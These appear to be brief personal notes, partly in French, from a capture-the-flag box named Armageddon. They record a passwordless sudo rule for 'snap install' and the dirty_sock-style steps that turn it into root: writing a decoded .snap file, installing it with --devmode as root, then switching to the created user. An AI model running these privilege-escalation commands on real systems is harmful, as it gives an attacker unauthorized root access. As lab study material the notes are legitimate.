root piste :
User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *


lien snap root :
https://github.com/GTFOBins/GTFOBins.github.io/issues/181

ython2 -c 'print "" + "A" * 4256 + "=="' | base64 -d > yo.snap

sudo /usr/bin/snap install --devmode filename.snap

su -l dirty-sock
